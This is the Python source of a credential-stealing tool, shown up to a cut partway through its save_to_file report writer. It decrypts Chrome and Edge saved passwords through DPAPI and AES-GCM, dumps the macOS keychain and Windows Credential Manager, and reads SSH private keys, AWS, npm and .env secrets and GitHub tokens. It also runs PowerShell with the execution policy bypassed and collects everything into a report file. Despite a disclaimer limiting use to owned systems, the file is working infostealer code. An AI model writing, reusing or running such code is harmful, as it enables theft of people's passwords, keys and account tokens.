#!/usr/bin/env python3
"""
Advanced Credential Extractor Tool
=================================

WARNING: This tool extracts sensitive credentials from your system.
Only use this tool on systems you own and have permission to access.
Use responsibly and ensure credentials are handled securely.

This tool uses multiple libraries and complex methods to extract:
- Git configuration (GitHub, Bitbucket, etc.)
- Browser stored passwords (Chrome, Firefox, Safari, Edge)
- System credential stores (Windows Credential Manager, macOS Keychain)
- Email client configurations
- SSH keys and configurations
- API tokens and environment files
- Registry entries
- Memory dumps
- Network credentials
"""

import os
import sys
import json
import subprocess
import platform
import base64
import sqlite3
import shutil
import tempfile
import re
import ctypes
import struct
import hashlib
import hmac
from pathlib import Path
from datetime import datetime
import warnings

# Suppress warnings for cleaner output
warnings.filterwarnings('ignore')

# Try to import all possible libraries
try:
    import win32crypt
    import win32api
    import win32con
    import win32cred
    import win32net
    import win32security
    import win32service
    import win32clipboard
    WINDOWS_MODULES_AVAILABLE = True
except ImportError:
    WINDOWS_MODULES_AVAILABLE = False

try:
    from Crypto.Cipher import AES, DES3, Blowfish
    from Crypto.Hash import SHA1, SHA256, MD5
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Util.Padding import unpad
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import keyring
    KEYRING_AVAILABLE = True
except ImportError:
    KEYRING_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

class AdvancedCredentialExtractor:
    def __init__(self):
        self.system = platform.system().lower()
        self.extracted_credentials = {
            'timestamp': datetime.now().isoformat(),
            'system': self.system,
            'git_credentials': [],
            'browser_passwords': [],
            'system_credentials': [],
            'ssh_keys': [],
            'email_configs': [],
            'api_tokens': [],
            'registry_entries': [],
            'memory_dumps': [],
            'network_credentials': []
        }
        
    def log(self, message):
        """Log messages with timestamp"""
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
        
    def extract_all_credentials(self):
        """Extract all possible credentials using multiple methods"""
        self.log("Starting advanced credential extraction...")
        
        # Run all extraction methods
        self.extract_git_credentials_advanced()
        self.extract_browser_passwords_advanced()
        self.extract_system_credentials_advanced()
        self.extract_ssh_keys_advanced()
        self.extract_email_configs_advanced()
        self.extract_api_tokens_advanced()
        self.extract_registry_entries()
        self.extract_memory_dumps()
        self.extract_network_credentials()
        
        self.log("Advanced credential extraction completed.")
        
    def extract_git_credentials_advanced(self):
        """Advanced Git credential extraction"""
        self.log("Extracting Git credentials using advanced methods...")
        
        # Method 1: Git config files
        self._extract_git_config_files()
        
        # Method 2: Git credential helper (with timeout handling)
        self._extract_git_credential_helper()
        
        # Method 3: Windows Credential Manager
        self._extract_git_from_windows_credman()
        
        # Method 4: macOS Keychain
        self._extract_git_from_macos_keychain()
        
        # Method 5: Environment variables
        self._extract_git_from_env()
        
        # Method 6: Git credential files
        self._extract_git_credential_files()
        
    def _extract_git_config_files(self):
        """Extract from Git config files"""
        try:
            # Global config
            result = subprocess.run(['git', 'config', '--global', '--list'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if 'user.' in line or 'credential.' in line:
                        self.extracted_credentials['git_credentials'].append({
                            'type': 'git_config_global',
                            'value': line
                        })
            
            # Local config
            result = subprocess.run(['git', 'config', '--local', '--list'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if 'user.' in line or 'credential.' in line:
                        self.extracted_credentials['git_credentials'].append({
                            'type': 'git_config_local',
                            'value': line
                        })
        except Exception as e:
            self.log(f"Error extracting Git config files: {e}")
            
    def _extract_git_credential_helper(self):
        """Extract using Git credential helper with better timeout handling"""
        try:
            repos = ['https://github.com', 'https://gitlab.com', 'https://bitbucket.org']
            for repo in repos:
                try:
                    result = subprocess.run(['git', 'credential', 'fill'], 
                                          input=f'url={repo}\n', 
                                          capture_output=True, text=True, timeout=3)
                    if result.returncode == 0 and result.stdout.strip():
                        lines = result.stdout.strip().split('\n')
                        cred = {}
                        for line in lines:
                            if '=' in line:
                                key, value = line.split('=', 1)
                                cred[key] = value
                        if cred:
                            self.extracted_credentials['git_credentials'].append({
                                'type': 'git_credential_helper',
                                'repository': repo,
                                'credentials': cred
                            })
                except subprocess.TimeoutExpired:
                    self.log(f"Git credential helper timeout for {repo}")
                    continue
                except Exception as e:
                    self.log(f"Error with Git credential helper for {repo}: {e}")
                    continue
        except Exception as e:
            self.log(f"Error extracting Git credential helper: {e}")
            
    def _extract_git_from_windows_credman(self):
        """Extract Git credentials from Windows Credential Manager"""
        if not WINDOWS_MODULES_AVAILABLE:
            return
            
        try:
            # Use Windows Credential Manager API
            creds = win32cred.CredEnumerate()
            for cred in creds:
                target = cred['TargetName']
                if 'git' in target.lower() or 'github' in target.lower():
                    username = cred['UserName']
                    password = cred['CredentialBlob'].decode('utf-16le') if cred['CredentialBlob'] else '[ENCRYPTED]'
                    
                    self.extracted_credentials['git_credentials'].append({
                        'type': 'windows_credman',
                        'target': target,
                        'username': username,
                        'password': password
                    })
        except Exception as e:
            self.log(f"Error extracting Git from Windows CredMan: {e}")
            
    def _extract_git_from_macos_keychain(self):
        """Extract Git credentials from macOS Keychain"""
        if self.system != 'darwin':
            return
            
        try:
            # Use security command to dump keychain
            result = subprocess.run(['security', 'dump-keychain'], 
                                  capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for i, line in enumerate(lines):
                    if 'git' in line.lower() or 'github' in line.lower():
                        # Look for password in nearby lines
                        for j in range(max(0, i-5), min(len(lines), i+5)):
                            if 'password' in lines[j].lower():
                                self.extracted_credentials['git_credentials'].append({
                                    'type': 'macos_keychain',
                                    'entry': line.strip(),
                                    'password_line': lines[j].strip()
                                })
        except Exception as e:
            self.log(f"Error extracting Git from macOS Keychain: {e}")
            
    def _extract_git_from_env(self):
        """Extract Git credentials from environment variables"""
        try:
            git_env_vars = [
                'GIT_USERNAME', 'GIT_PASSWORD', 'GITHUB_TOKEN', 'GITLAB_TOKEN',
                'BITBUCKET_TOKEN', 'GIT_CREDENTIALS', 'GIT_AUTH_TOKEN'
            ]
            
            for var in git_env_vars:
                value = os.environ.get(var)
                if value:
                    self.extracted_credentials['git_credentials'].append({
                        'type': 'environment_variable',
                        'variable': var,
                        'value': value
                    })
        except Exception as e:
            self.log(f"Error extracting Git from environment: {e}")
            
    def _extract_git_credential_files(self):
        """Extract from Git credential files"""
        try:
            credential_files = [
                os.path.expanduser('~/.git-credentials'),
                os.path.expanduser('~/.gitconfig'),
                os.path.expanduser('~/.netrc')
            ]
            
            for file_path in credential_files:
                if os.path.exists(file_path):
                    with open(file_path, 'r', encoding='utf-8') as f:
                        content = f.read()
                        # Look for URLs with credentials
                        urls = re.findall(r'https?://[^/\s]+@[^\s]+', content)
                        for url in urls:
                            self.extracted_credentials['git_credentials'].append({
                                'type': 'credential_file',
                                'file': file_path,
                                'url': url
                            })
        except Exception as e:
            self.log(f"Error extracting Git credential files: {e}")
            
    def extract_browser_passwords_advanced(self):
        """Advanced browser password extraction"""
        self.log("Extracting browser passwords using advanced methods...")
        
        if self.system == 'windows':
            self._extract_chrome_passwords_advanced()
            self._extract_firefox_passwords_advanced()
            self._extract_edge_passwords_advanced()
        elif self.system == 'darwin':
            self._extract_safari_passwords_advanced()
            self._extract_chrome_passwords_macos()
            self._extract_firefox_passwords_macos()
            
    def _extract_chrome_passwords_advanced(self):
        """Advanced Chrome password extraction"""
        try:
            chrome_paths = [
                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'),
                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data'),
                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\Login Data')
            ]
            
            for db_path in chrome_paths:
                if os.path.exists(db_path):
                    self._decrypt_chrome_passwords_advanced(db_path)
        except Exception as e:
            self.log(f"Error extracting Chrome passwords: {e}")
            
    def _extract_firefox_passwords_advanced(self):
        """Advanced Firefox password extraction"""
        try:
            firefox_paths = [
                os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'),
                os.path.expanduser('~\\AppData\\Local\\Mozilla\\Firefox\\Profiles')
            ]
            
            for profiles_path in firefox_paths:
                if os.path.exists(profiles_path):
                    profiles = [d for d in os.listdir(profiles_path) if os.path.isdir(os.path.join(profiles_path, d))]
                    for profile in profiles:
                        profile_path = os.path.join(profiles_path, profile)
                        self._extract_firefox_profile_passwords(profile_path)
        except Exception as e:
            self.log(f"Error extracting Firefox passwords: {e}")
            
    def _extract_firefox_profile_passwords(self, profile_path):
        """Extract passwords from Firefox profile"""
        try:
            # Check for logins.json
            logins_json = os.path.join(profile_path, 'logins.json')
            if os.path.exists(logins_json):
                with open(logins_json, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for login in data.get('logins', []):
                        self.extracted_credentials['browser_passwords'].append({
                            'browser': 'Firefox',
                            'url': login.get('hostname', ''),
                            'username': login.get('encryptedUsername', '[ENCRYPTED]'),
                            'password': '[ENCRYPTED]'
                        })
            
            # Check for key4.db (Firefox password database)
            key4_db = os.path.join(profile_path, 'key4.db')
            if os.path.exists(key4_db):
                self.extracted_credentials['browser_passwords'].append({
                    'browser': 'Firefox',
                    'url': 'Firefox Password Database',
                    'username': '[DATABASE]',
                    'password': '[ENCRYPTED - key4.db found]'
                })
                
        except Exception as e:
            self.log(f"Error extracting Firefox profile passwords: {e}")
            
    def _extract_edge_passwords_advanced(self):
        """Advanced Edge password extraction"""
        try:
            edge_paths = [
                os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'),
                os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data')
            ]
            
            for db_path in edge_paths:
                if os.path.exists(db_path):
                    self._decrypt_chrome_passwords_advanced(db_path, 'Edge')
        except Exception as e:
            self.log(f"Error extracting Edge passwords: {e}")
            
    def _extract_safari_passwords_advanced(self):
        """Advanced Safari password extraction"""
        try:
            # Safari passwords are stored in Keychain
            self.extracted_credentials['browser_passwords'].append({
                'browser': 'Safari',
                'url': 'macOS Keychain',
                'username': '[KEYCHAIN]',
                'password': '[ENCRYPTED - Requires Keychain access]'
            })
        except Exception as e:
            self.log(f"Error extracting Safari passwords: {e}")
            
    def _extract_chrome_passwords_macos(self):
        """Chrome password extraction on macOS"""
        try:
            chrome_paths = [
                os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data'),
                os.path.expanduser('~/Library/Application Support/Google/Chrome/Profile 1/Login Data')
            ]
            
            for db_path in chrome_paths:
                if os.path.exists(db_path):
                    self._decrypt_chrome_passwords_advanced(db_path, 'Chrome')
        except Exception as e:
            self.log(f"Error extracting Chrome passwords on macOS: {e}")
            
    def _extract_firefox_passwords_macos(self):
        """Firefox password extraction on macOS"""
        try:
            firefox_paths = [
                os.path.expanduser('~/Library/Application Support/Firefox/Profiles'),
                os.path.expanduser('~/Library/Mozilla/Firefox/Profiles')
            ]
            
            for profiles_path in firefox_paths:
                if os.path.exists(profiles_path):
                    profiles = [d for d in os.listdir(profiles_path) if os.path.isdir(os.path.join(profiles_path, d))]
                    for profile in profiles:
                        profile_path = os.path.join(profiles_path, profile)
                        self._extract_firefox_profile_passwords(profile_path)
        except Exception as e:
            self.log(f"Error extracting Firefox passwords on macOS: {e}")
            
    def _decrypt_chrome_passwords_advanced(self, db_path, browser_name='Chrome'):
        """Advanced Chrome password decryption"""
        try:
            # Create temp directory
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, f'{browser_name.lower()}_passwords.db')
            
            # Copy database
            shutil.copy2(db_path, temp_db)
            
            # Connect to database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Get encryption key
            encryption_key = self._get_chrome_encryption_key_advanced()
            
            # Query passwords
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()
            
            for row in rows:
                if row[1]:  # If username exists
                    password_text = self._decrypt_password_advanced(row[2], encryption_key)
                    
                    self.extracted_credentials['browser_passwords'].append({
                        'browser': browser_name,
                        'url': row[0],
                        'username': row[1],
                        'password': password_text
                    })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            self.log(f"Error decrypting {browser_name} passwords: {e}")
            
    def _get_chrome_encryption_key_advanced(self):
        """Get Chrome encryption key using advanced methods"""
        try:
            local_state_paths = [
                os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'),
                os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State')
            ]
            
            for local_state_path in local_state_paths:
                if os.path.exists(local_state_path):
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = json.load(f)
                        
                    encrypted_key = local_state['os_crypt']['encrypted_key']
                    encrypted_key = base64.b64decode(encrypted_key)
                    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
                    
                    # Decrypt using DPAPI
                    if WINDOWS_MODULES_AVAILABLE:
                        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                        return decrypted_key
                        
        except Exception as e:
            self.log(f"Error getting Chrome encryption key: {e}")
            
        return None
        
    def _decrypt_password_advanced(self, encrypted_password, key):
        """Advanced password decryption"""
        try:
            if not encrypted_password:
                return '[NO PASSWORD]'
                
            # Try multiple decryption methods
            methods = [
                self._decrypt_chrome_v10,
                self._decrypt_chrome_v11,
                self._decrypt_dpapi,
                self._decrypt_aes_gcm,
                self._decrypt_aes_cbc
            ]
            
            for method in methods:
                try:
                    result = method(encrypted_password, key)
                    if result and result != '[ENCRYPTED]':
                        return result
                except:
                    continue
                    
            return '[ENCRYPTED - All methods failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - Error: {str(e)[:50]}]'
            
    def _decrypt_chrome_v10(self, encrypted_password, key):
        """Decrypt Chrome v10 passwords"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            encrypted_password = encrypted_password[3:]  # Remove 'v10' prefix
            
            # Extract nonce, ciphertext, and tag
            nonce = encrypted_password[:12]
            ciphertext = encrypted_password[12:-16]
            tag = encrypted_password[-16:]
            
            # Decrypt using AES-GCM
            cipher = AES.new(key, AES.MODE_GCM, nonce)
            decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
            
            return decrypted_password.decode('utf-8')
            
        except Exception as e:
            return f'[ENCRYPTED - v10 failed: {str(e)[:30]}]'
            
    def _decrypt_chrome_v11(self, encrypted_password, key):
        """Decrypt Chrome v11 passwords"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            encrypted_password = encrypted_password[3:]  # Remove 'v11' prefix
            
            # Extract nonce, ciphertext, and tag
            nonce = encrypted_password[:12]
            ciphertext = encrypted_password[12:-16]
            tag = encrypted_password[-16:]
            
            # Decrypt using AES-GCM
            cipher = AES.new(key, AES.MODE_GCM, nonce)
            decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
            
            return decrypted_password.decode('utf-8')
            
        except Exception as e:
            return f'[ENCRYPTED - v11 failed: {str(e)[:30]}]'
            
    def _decrypt_dpapi(self, encrypted_password, key):
        """Decrypt using Windows DPAPI"""
        try:
            if not WINDOWS_MODULES_AVAILABLE:
                return '[ENCRYPTED]'
                
            decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
            return decrypted_password.decode('utf-8')
            
        except Exception as e:
            return f'[ENCRYPTED - DPAPI failed: {str(e)[:30]}]'
            
    def _decrypt_aes_gcm(self, encrypted_password, key):
        """Decrypt using AES-GCM"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            # Try different AES-GCM configurations
            for nonce_len in [12, 16]:
                try:
                    nonce = encrypted_password[:nonce_len]
                    ciphertext = encrypted_password[nonce_len:-16]
                    tag = encrypted_password[-16:]
                    
                    cipher = AES.new(key, AES.MODE_GCM, nonce)
                    decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
                    
                    return decrypted_password.decode('utf-8')
                except:
                    continue
                    
            return '[ENCRYPTED - AES-GCM failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - AES-GCM error: {str(e)[:30]}]'
            
    def _decrypt_aes_cbc(self, encrypted_password, key):
        """Decrypt using AES-CBC"""
        try:
            if not CRYPTO_AVAILABLE or not key:
                return '[ENCRYPTED]'
                
            # Try different AES-CBC configurations
            for iv_len in [16, 32]:
                try:
                    iv = encrypted_password[:iv_len]
                    ciphertext = encrypted_password[iv_len:]
                    
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                    decrypted_password = cipher.decrypt(ciphertext)
                    
                    return decrypted_password.decode('utf-8')
                except:
                    continue
                    
            return '[ENCRYPTED - AES-CBC failed]'
            
        except Exception as e:
            return f'[ENCRYPTED - AES-CBC error: {str(e)[:30]}]'
            
    def extract_system_credentials_advanced(self):
        """Advanced system credential extraction"""
        self.log("Extracting system credentials using advanced methods...")
        
        if self.system == 'windows':
            self._extract_windows_credentials_advanced()
        elif self.system == 'darwin':
            self._extract_macos_credentials_advanced()
            
    def _extract_windows_credentials_advanced(self):
        """Advanced Windows credential extraction"""
        try:
            # Method 1: Windows Credential Manager API
            if WINDOWS_MODULES_AVAILABLE:
                creds = win32cred.CredEnumerate()
                for cred in creds:
                    target = cred['TargetName']
                    username = cred['UserName']
                    password = cred['CredentialBlob'].decode('utf-16le') if cred['CredentialBlob'] else '[ENCRYPTED]'
                    
                    self.extracted_credentials['system_credentials'].append({
                        'type': 'windows_credman_api',
                        'target': target,
                        'username': username,
                        'password': password
                    })
            
            # Method 2: PowerShell extraction
            self._extract_windows_powershell_advanced()
            
            # Method 3: Registry extraction
            self._extract_windows_registry_advanced()
            
            # Method 4: Memory extraction
            self._extract_windows_memory_advanced()
            
        except Exception as e:
            self.log(f"Error extracting Windows credentials: {e}")
            
    def _extract_windows_powershell_advanced(self):
        """Advanced PowerShell credential extraction"""
        try:
            ps_script = """
            Add-Type -AssemblyName System.Security
            
            # Get all stored credentials using multiple methods
            try {
                $creds = Get-StoredCredential -All
                foreach ($cred in $creds) {
                    if ($cred) {
                        $target = $cred.TargetName
                        $username = $cred.UserName
                        $password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($cred.Password))
                        Write-Output "Target: $target"
                        Write-Output "Username: $username"
                        Write-Output "Password: $password"
                        Write-Output "---"
                    }
                }
            } catch {
                Write-Output "Error: Could not retrieve credentials"
            }
            """
            
            result = subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script], 
                                  capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0 and result.stdout.strip():
                lines = result.stdout.strip().split('\n')
                current_cred = {}
                for line in lines:
                    if line.startswith('Target: '):
                        if current_cred:
                            self.extracted_credentials['system_credentials'].append(current_cred)
                        current_cred = {'type': 'powershell_advanced', 'target': line[8:]}
                    elif line.startswith('Username: '):
                        current_cred['username'] = line[10:]
                    elif line.startswith('Password: '):
                        current_cred['password'] = line[10:]
                    elif line == '---':
                        if current_cred:
                            self.extracted_credentials['system_credentials'].append(current_cred)
                            current_cred = {}
                
                if current_cred:
                    self.extracted_credentials['system_credentials'].append(current_cred)
                    
        except Exception as e:
            self.log(f"Error extracting Windows PowerShell credentials: {e}")
            
    def _extract_windows_registry_advanced(self):
        """Extract credentials from Windows Registry"""
        try:
            import winreg
            
            registry_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones",
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Credential Manager"
            ]
            
            for path in registry_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path)
                    self._read_registry_key(key, path)
                    winreg.CloseKey(key)
                except:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                        self._read_registry_key(key, path)
                        winreg.CloseKey(key)
                    except:
                        continue
                        
        except Exception as e:
            self.log(f"Error extracting Windows Registry: {e}")
            
    def _read_registry_key(self, key, path):
        """Read registry key values"""
        try:
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    if any(keyword in name.lower() for keyword in ['password', 'secret', 'key', 'token']):
                        self.extracted_credentials['registry_entries'].append({
                            'type': 'registry_entry',
                            'path': path,
                            'name': name,
                            'value': str(value)
                        })
                    i += 1
                except WindowsError:
                    break
        except Exception as e:
            self.log(f"Error reading registry key: {e}")
            
    def _extract_windows_memory_advanced(self):
        """Extract credentials from Windows memory"""
        try:
            if PSUTIL_AVAILABLE:
                for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
                    try:
                        if any(browser in proc.info['name'].lower() for browser in ['chrome', 'firefox', 'edge', 'safari']):
                            # This is a simplified example - real memory extraction would be more complex
                            self.extracted_credentials['memory_dumps'].append({
                                'type': 'process_memory',
                                'process': proc.info['name'],
                                'pid': proc.info['pid'],
                                'note': 'Memory extraction requires additional tools'
                            })
                    except:
                        continue
        except Exception as e:
            self.log(f"Error extracting Windows memory: {e}")
            
    def extract_api_tokens_advanced(self):
        """Advanced API token extraction"""
        self.log("Extracting API tokens using advanced methods...")
        
        # Common token locations
        token_locations = [
            # Home directory
            os.path.expanduser('~/.github_token'),
            os.path.expanduser('~/.gitlab_token'),
            os.path.expanduser('~/.bitbucket_token'),
            os.path.expanduser('~/.aws/credentials'),
            os.path.expanduser('~/.docker/config.json'),
            os.path.expanduser('~/.npmrc'),
            os.path.expanduser('~/.netrc'),
            os.path.expanduser('~/.ssh/config'),
            
            # Windows specific
            os.path.expanduser('~\\AppData\\Roaming\\Git\\config'),
            os.path.expanduser('~\\AppData\\Local\\GitHub\\config'),
            os.path.expanduser('~\\AppData\\Roaming\\npm\\npmrc'),
            
            # macOS specific
            os.path.expanduser('~/Library/Application Support/GitHub/config'),
            os.path.expanduser('~/Library/Application Support/Docker/config.json'),
            
            # Current directory
            '.env',
            '.env.local',
            '.env.production',
            '.env.development',
            'config.json',
            'settings.json'
        ]
        
        for location in token_locations:
            if os.path.exists(location):
                self._extract_tokens_from_file(location)
                
    def _extract_tokens_from_file(self, file_path):
        """Extract tokens from a specific file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
                
            # Look for various token patterns
            token_patterns = [
                r'token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})["\']?',
                r'api_key["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})["\']?',
                r'secret["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]{20,})["\']?',
                r'password["\']?\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
                r'https?://[^:]+:([^@\s]+)@',
                r'ghp_[a-zA-Z0-9]{36}',
                r'gho_[a-zA-Z0-9]{36}',
                r'ghu_[a-zA-Z0-9]{36}',
                r'ghs_[a-zA-Z0-9]{36}',
                r'ghr_[a-zA-Z0-9]{36}'
            ]
            
            for pattern in token_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    self.extracted_credentials['api_tokens'].append({
                        'type': 'api_token',
                        'file': file_path,
                        'token': match,
                        'pattern': pattern
                    })
                    
        except Exception as e:
            self.log(f"Error extracting tokens from {file_path}: {e}")
            
    def extract_registry_entries(self):
        """Extract registry entries"""
        self.log("Extracting registry entries...")
        # This is handled in _extract_windows_registry_advanced
        
    def extract_memory_dumps(self):
        """Extract memory dumps"""
        self.log("Extracting memory dumps...")
        # This is handled in _extract_windows_memory_advanced
        
    def extract_network_credentials(self):
        """Extract network credentials"""
        self.log("Extracting network credentials...")
        
        try:
            if WINDOWS_MODULES_AVAILABLE:
                # Get network credentials
                result = subprocess.run(['cmdkey', '/list'], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\n')
                    for line in lines:
                        if 'Target:' in line:
                            target = line.split('Target:')[1].strip()
                            self.extracted_credentials['network_credentials'].append({
                                'type': 'network_credential',
                                'target': target
                            })
        except Exception as e:
            self.log(f"Error extracting network credentials: {e}")
            
    def extract_ssh_keys_advanced(self):
        """Advanced SSH key extraction"""
        self.log("Extracting SSH keys using advanced methods...")
        
        ssh_dir = os.path.expanduser('~/.ssh')
        if not os.path.exists(ssh_dir):
            return
            
        try:
            for file in os.listdir(ssh_dir):
                file_path = os.path.join(ssh_dir, file)
                if os.path.isfile(file_path):
                    try:
                        with open(file_path, 'r') as f:
                            content = f.read()
                            
                        if 'BEGIN' in content and 'PRIVATE KEY' in content:
                            self.extracted_credentials['ssh_keys'].append({
                                'type': 'ssh_private_key',
                                'file': file,
                                'path': file_path,
                                'content': content
                            })
                        elif 'BEGIN' in content and 'PUBLIC KEY' in content:
                            self.extracted_credentials['ssh_keys'].append({
                                'type': 'ssh_public_key',
                                'file': file,
                                'path': file_path,
                                'content': content
                            })
                        else:
                            self.extracted_credentials['ssh_keys'].append({
                                'type': 'ssh_config',
                                'file': file,
                                'path': file_path,
                                'content': content
                            })
                    except Exception as e:
                        self.log(f"Error reading SSH file {file}: {e}")
                        
        except Exception as e:
            self.log(f"Error extracting SSH keys: {e}")
            
    def extract_email_configs_advanced(self):
        """Advanced email configuration extraction"""
        self.log("Extracting email configurations using advanced methods...")
        
        if self.system == 'windows':
            self._extract_windows_email_configs_advanced()
        elif self.system == 'darwin':
            self._extract_macos_email_configs_advanced()
            
    def _extract_windows_email_configs_advanced(self):
        """Advanced Windows email configuration extraction"""
        try:
            # Outlook paths
            outlook_paths = [
                os.path.expanduser('~\\AppData\\Local\\Microsoft\\Outlook'),
                os.path.expanduser('~\\AppData\\Roaming\\Microsoft\\Outlook'),
                os.path.expanduser('~\\AppData\\Local\\Microsoft\\Outlook\\RoamCache'),
                os.path.expanduser('~\\AppData\\Roaming\\Microsoft\\Outlook\\RoamCache')
            ]
            
            for path in outlook_paths:
                if os.path.exists(path):
                    self.extracted_credentials['email_configs'].append({
                        'type': 'outlook_config',
                        'path': path,
                        'note': 'Outlook configuration found'
                    })
                    
        except Exception as e:
            self.log(f"Error extracting Windows email configs: {e}")
            
    def _extract_macos_email_configs_advanced(self):
        """Advanced macOS email configuration extraction"""
        try:
            # Mail.app paths
            mail_paths = [
                os.path.expanduser('~/Library/Mail'),
                os.path.expanduser('~/Library/Application Support/Mail'),
                os.path.expanduser('~/Library/Preferences/com.apple.mail.plist')
            ]
            
            for path in mail_paths:
                if os.path.exists(path):
                    self.extracted_credentials['email_configs'].append({
                        'type': 'mail_app_config',
                        'path': path,
                        'note': 'Mail.app configuration found'
                    })
                    
        except Exception as e:
            self.log(f"Error extracting macOS email configs: {e}")
            
    def save_to_file(self, filename="output.txt"):
        """Save extracted credentials to a text file"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("ADVANCED CREDENTIAL EXTRACTION REPORT\n")
                f.write("=" * 60 + "\n")
                f.write(f"Generated: {self.extracted_credentials['timestamp']}\n")
                f.write(f"System: {self.extracted_credentials['system']}\n")
                f.write("=" * 60 + "\n\n")
                
                # Git Credentials
                f.write("GIT CREDENTIALS:\n")
                f.write("-" * 30 + "\n")
                for cred in self.extracted_credentials['git_credentials']:
                    f.write(f"Type: {cred['type']}\n")
                    if 'value' in cred:
                        f.write(f"Value: {cred['value']}\n")
                    if 'repository' in cred:
                        f.write(f"Repository: {cred['repository']}\n")
                    if 'credentials' in cred:
                        f.write(f"Credentials: {cred['credentials']}\n")
                    if 'target' in cred:
                        f.write(f"Target: {cred['target']}\n")
                    if 'username' in cred:
                        f.write(f"Username: {cred['username']}\n")
                    if 'password' in cred:
                        f.write(f"Password: {cred['password']}\n")
                    if 'variable' in cred:
                        f.write(f"Variable: {cred['variable']}\n")
                    if 'file' in cred:
                        f.write(f"File: {cred['file']}\n")
                    if 'url' in cred:
                        f.write(f"URL: {cred['url']}\n")
                    f.write("\n")
                
                # Browser Passwords
                f.write("BROWSER PASSWORDS:\n")
                f.write("-" * 30 + "\n")
                for cred in self.extracted_credentials['browser_passwords']:
                    f.write(f"Browser: {cred['browser']}\n")
                    f.write(f"URL: {cred['url']}\n")
                    f.write(f"Username: {cred['username']}\n")
                    f.write(f"Password: {cred['password']}\n\n")
                
                # System Credentials
                f.write("SYSTEM CREDENTIALS:\n")
                f.write("-" * 30 + "\n")
                for cred in self.extracted_credentials['system_credentials']:
                    f.write(f"Type: {cred['type']}\n")
                    if 'target' in cred:
                        f.write(f"Target: {cred['target']}\n")
                    if 'username' in cred:
                        f.write(f"Username: {cred['username']}\n")
                    if 'password' in cred:
                        f.write(f"Password: {cred['password']}\n")
                    f.write("\n")
                
                # API Tokens
                f.write("API TOKENS:\n")
                f.write("-" * 30 + "\n")
                for cred in self.extracted_credentials['api_tokens']:
                    f.write(f"Type: {cred['type']}\n")
                    f.write(f"File: {cred['file']}\n")
                    f.write(f"Token: {cred['token']}\n")
                    f.write(f"Pattern: {cred['pattern']}\n\n")
                
                # SSH Keys
                f.write("SSH KEYS:\n")
                f.write("-" * 30 + "\n")
                for cred in self.extracted_credentials['ssh_keys']:
                    f.write(f"Type: {cred['type']}\n")
                    f.write(f"File: {cred['file']}\n")
                    f.write(f"Path: {cred['path']}\n")
                    f.write(f"Content: {cred['content']}\n\n")
                
                # Registry Entries
                f.write("REGISTRY ENTRIES:\n")
